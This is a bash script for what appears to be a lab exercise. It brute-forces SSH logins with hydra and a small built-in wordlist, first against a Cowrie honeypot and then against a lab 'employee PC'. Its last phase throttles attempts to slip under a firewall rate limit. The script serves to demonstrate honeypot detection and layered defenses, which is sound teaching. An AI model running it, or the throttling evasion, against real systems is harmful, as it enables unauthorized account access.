#!/bin/bash
# attack4_brute.sh - SSH brute-force credential attack.
#
# Demonstrates THREE phases that together tell the deception story:
#
#   (a) Naive attacker hits the HONEYPOT first (Cowrie on 192.168.4.20).
#       Cowrie will happily "accept" weak credentials and let the attacker
#       in. The blue team has high-confidence evidence of intrusion.
#
#   (b) Aggressive attacker hits the EMPLOYEE PC (192.168.4.30).
#       Expected: blocked after ~4 attempts (firewall recent module).
#
#   (c) Advanced attacker: slow brute force at 1 attempt / 20s.
#       Stays under the 4-per-60s firewall threshold and still makes
#       progress against the employee PC.
#
# Why this is in the threat model:
#   Brute force is the canonical attack against any exposed authentication
#   service. With a honeypot present, brute force ALSO becomes the most
#   reliable detection signal via a single login attempt against the
#   honeypot, defense should see it as an attack.

source "$(dirname "$0")/config.sh"
require_root

if ! command -v hydra >/dev/null 2>&1; then
    warn "hydra not installed. On Kali: sudo apt install -y hydra"
    exit 1
fi

OUT="$EVIDENCE_DIR/attack4_brute_$TIMESTAMP"
mkdir -p "$OUT"

# --- Build a small demo wordlist -------------------------------------------
WORDLIST="$OUT/demo_wordlist.txt"
cat > "$WORDLIST" <<'EOF'
123456
password
admin
qwerty
letmein
password123
welcome
toor
kali
root
test
demo
EOF
ok "Wordlist with $(wc -l < "$WORDLIST") candidates: $WORDLIST"

banner "ATTACK 4 - SSH BRUTE-FORCE"
echo "Honeypot     : $HONEYPOT_IP   (the lure)"
echo "Employee PC  : $EMPLOYEE_IP   (the real target)"
echo "Wordlist     : $WORDLIST"
echo "Evidence dir : $OUT"
echo
warn "Only run against the lab targets. Press Ctrl-C in 5s to abort..."
sleep 5

# --- (a) Naive attacker hits the honeypot ----------------------------------
step "Phase A: Naive attacker -- aggressive brute force against the HONEYPOT"
step "Cowrie will 'accept' weak credentials. This trips the wire instantly."
hydra -l admin -P "$WORDLIST" -t 4 -V \
      -o "$OUT/a_honeypot_results.txt" \
      "ssh://$HONEYPOT_IP" 2>&1 | tee "$OUT/a_honeypot_console.txt"
ok "Honeypot phase complete -- check Cowrie's logs on the blue team side."
echo

# Brief pause
step "Sleeping 30s before pivoting to the employee PC..."
sleep 30

# --- (b) Aggressive attacker hits the employee PC --------------------------
step "Phase B: Aggressive brute force against the EMPLOYEE PC"
step "Expected outcome WITH defenses: blocked after ~4 attempts (recent module)"
step "Expected outcome WITHOUT defenses: completes wordlist in seconds"
hydra -l admin -P "$WORDLIST" -t 8 -V \
      -o "$OUT/b_employee_aggressive_results.txt" \
      "ssh://$EMPLOYEE_IP" 2>&1 | tee "$OUT/b_employee_aggressive_console.txt"
ok "Aggressive phase complete."
echo

# Brief pause so the firewall's "recent" timer expires before phase C
step "Sleeping 70s to let the firewall's per-source recent-list expire..."
sleep 70

# --- (c) Slow attacker still makes progress --------------------------------
step "Phase C: SLOW attack against EMPLOYEE PC: 1 thread, 20s between attempts"
step "Stays under the firewall's rate limit (4 new conns/60s)."
step "It is SLOW but should still make progress: the 'advanced attacker' point."

ATTEMPT=0
while IFS= read -r pw; do
    ATTEMPT=$((ATTEMPT + 1))
    echo "[C/$ATTEMPT] Trying admin:$pw" | tee -a "$OUT/c_employee_slow_console.txt"
    hydra -l admin -p "$pw" -t 1 -f \
          "ssh://$EMPLOYEE_IP" 2>&1 | tee -a "$OUT/c_employee_slow_console.txt"
    if grep -q "host:.*login:.*password:" "$OUT/c_employee_slow_console.txt"; then
        ok "Credential found in slow phase. Stopping."
        break
    fi
    # 20s delay = 3 attempts/min, well under the 4/min firewall threshold
    sleep 20
done < "$WORDLIST"
ok "Slow phase complete."
echo

ok "Brute-force attack complete. Evidence in: $OUT"
echo
echo "For your report, screenshot:"
echo "  - $OUT/a_honeypot_console.txt           (Cowrie 'accepted' creds)"
echo "  - The Cowrie session log on the honeypot (commands typed by attacker)"
echo "  - $OUT/b_employee_aggressive_console.txt (rapid drops once defenses kick in)"
echo "  - $OUT/c_employee_slow_console.txt       (slow attack still progresses)"
echo "  - The blue team's iptables LOG output (SSH-BRUTE: prefix)"
echo "  - The blue team's Snort alert log (SID 1000004)"
echo
warn "KEY POINT 1: The honeypot makes the FIRST attempt visible immediately."
warn "KEY POINT 2: A patient attacker who throttles below the rate-limit can"
warn "             still attempt the dictionary against the real target."
warn "             Defense in depth (key-only auth, fail2ban) is required."
